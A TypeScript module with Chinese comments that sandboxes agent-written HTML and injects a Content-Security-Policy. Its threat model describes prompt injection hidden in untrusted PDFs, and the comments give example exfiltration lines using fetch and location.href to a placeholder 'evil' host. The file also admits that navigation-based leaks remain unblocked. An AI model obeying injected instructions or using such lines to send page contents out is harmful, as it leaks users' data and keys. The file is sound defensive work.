/** agent 写的 HTML，在渲染之前要过的那道手续。
 *
 * # 这是这条链上最危险的字节
 *
 * agent 读的是**不受信的 PDF**。一篇论文里埋一句提示注入，就能让它写出任意
 * 脚本。而浏览器里 localStorage 存着用户的 API Key（明文存是有意的设计）。
 * 所以「agent 写的 HTML 在应用自己的源上执行」这件事必须在结构上不可能发生，
 * 不能靠「agent 应该不会这么干」。
 *
 * # 三道，缺一不可
 *
 * 1. **后端**：`forces_attachment("html")`，堵死在 API 源上内联打开（ai_board.rs）。
 *    前端走 `fetch()` 拿字节，它不看 Content-Disposition。
 * 2. **不同源**：`sandbox="allow-scripts"` 且**不给 `allow-same-origin`**。
 *    这时 iframe 拿到一个唯一的不透明源，读不到应用的 localStorage、碰不到
 *    父页面 DOM。两个值同时给**等于没有沙箱** —— 这是最容易犯的错，有门禁守着。
 * 3. **挡取数据**：注入 CSP。沙箱挡住了「读你的数据」，没挡住「往外发」——
 *    一个 `fetch("https://evil/?" + document.body.innerText)` 照样能把这篇论文
 *    的内容送走。CSP 把 fetch / XHR / img / beacon 这一族关掉。
 *
 * # 这一条我原来写错了：CSP **管不住导航**
 *
 * 原话是「CSP 把出网整个关掉」。不对。`default-src 'none'` 是 fetch 指令族，
 * 管不了文档**自己的导航** —— 一行 `location.href = "https://evil/?" + …`
 * 或者 `<meta http-equiv=refresh>` 照样把内容送出去（`navigate-to` 指令已从
 * CSP3 移除，浏览器没实现）。
 *
 * 能管住 iframe 导航的是**父页面**的 `frame-src`，而这个应用目前**没有任何
 * 文档级 CSP**。`sandbox="allow-scripts"` 挡住了顶层导航、弹窗和表单提交，
 * 但「自己导航自己」是允许的。
 *
 * 也就是说这条防线目前是：**读不到你的数据（确定），但挡不住它把自己看到的
 * 内容发走**。要补上得给阅读页加一条含 `frame-src 'self'` 的文档级 CSP。
 * 没做 —— 那要动 HTML 入口和后端响应头，是另一件事。
 *
 * # 代价：agent 不能引 CDN
 *
 * 所有东西得内联。这反而是对的：产物自包含，存下来离线也能看。AGENTS.md 里
 * 说清楚了。
 */

/** iframe 的 sandbox 值。
 *
 * **不要加 allow-same-origin。** 它和 allow-scripts 同时出现时，iframe 里的
 * 脚本可以拿到 `parent.document`，进而移除自己的 sandbox 属性并重新加载 ——
 * 沙箱等于没有。
 *
 * allow-scripts 是必须的：不给脚本就只能看静态 HTML，图表库全废，这个功能就
 * 没意义了。
 */
export const BOARD_HTML_SANDBOX = "allow-scripts";

/** 注进去的 CSP。
 *
 * - `default-src 'none'`：默认什么都不许加载，出网整个关掉
 * - `img-src data: blob:`：图表库常把图画成 data URL
 * - `style-src 'unsafe-inline'` / `script-src 'unsafe-inline'`：内联的样式和脚本
 *   要能跑。`'unsafe-inline'` 在这里不降低安全性 —— 我们本来就是在执行一份
 *   完全由 agent 写的文档，没有「只信任一部分脚本」这回事；真正的边界是不同源
 *   加上不许出网。
 * - `font-src data:`：内联字体
 *
 * 注意没有 `connect-src` 的放行项 —— `default-src 'none'` 兜住它。
 *
 * **但 `form-action` 不在 default-src 的回退链里**（我原来以为在）。表单提交
 * 目前是 sandbox 挡的（没给 `allow-forms`），不是 CSP —— 防御纵深比这段注释
 * 原来描述的少一层。
 */
export const BOARD_HTML_CSP = [
  "default-src 'none'",
  "img-src data: blob:",
  "style-src 'unsafe-inline'",
  "script-src 'unsafe-inline'",
  "font-src data:",
].join("; ");

/** 把 CSP 塞进文档头部。
 *
 * 用 `<meta http-equiv>` 而不是响应头：这份 HTML 是我们用 srcdoc 灌进去的，
 * 根本没有经过 HTTP 响应，没有头可加。
 *
 * **必须插在任何 `<script>` 之前**：meta CSP 只约束它之后的内容，插晚了前面的
 * 脚本已经跑过了。
 *
 * # 前面要带 doctype —— 我原来漏了这个
 *
 * 原来直接把 meta 怼在最前，注释写「位置在 doctype 之前也没关系，浏览器照样
 * 解析」。解析是没问题，**但模式变了**：HTML 解析器在 initial insertion mode
 * 见到 `<meta>` 这种开始标签会走 "anything else" 分支，**打开 quirks 标志**，
 * 而 agent 自己那个 `<!doctype html>` 随后出现在 in-head 阶段会被直接忽略。
 * 后果是 agent 本地看着对的 `height:100%` 链、表格、box-sizing 到了这里变形。
 *
 * 所以自己先写一个 doctype。原文里多出来的第二个会被忽略，「CSP 一定最早」
 * 这条不变。
 */
export function withBoardHtmlCsp(html: string): string {
  return `<!doctype html>\n<meta http-equiv="Content-Security-Policy" content="${BOARD_HTML_CSP}">\n${html}`;
}
